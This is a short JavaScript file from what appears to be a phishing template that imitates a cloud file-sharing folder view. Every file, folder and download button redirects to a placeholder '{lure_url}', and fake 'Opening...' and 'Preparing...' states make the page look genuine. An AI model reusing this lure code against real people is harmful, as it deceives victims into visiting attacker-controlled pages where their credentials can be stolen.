function accessFile() {
    window.location.href = '{lure_url}';
}

function accessFolder() {
    const btn = document.querySelector('.btn-box-primary');
    btn.innerHTML = '<span>Opening...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1000);
}

function downloadFolder() {
    const btn = document.querySelector('.btn-box-secondary');
    btn.innerHTML = '<span>Preparing...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.querySelectorAll('.file-name').forEach(file => {
    file.addEventListener('click', () => {
        window.location.href = '{lure_url}';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const rows = document.querySelectorAll('.file-row');
    rows.forEach((row, index) => {
        row.style.opacity = '0';
        row.style.transform = 'translateX(-20px)';
        setTimeout(() => {
            row.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            row.style.opacity = '1';
            row.style.transform = 'translateX(0)';
        }, index * 80);
    });
});
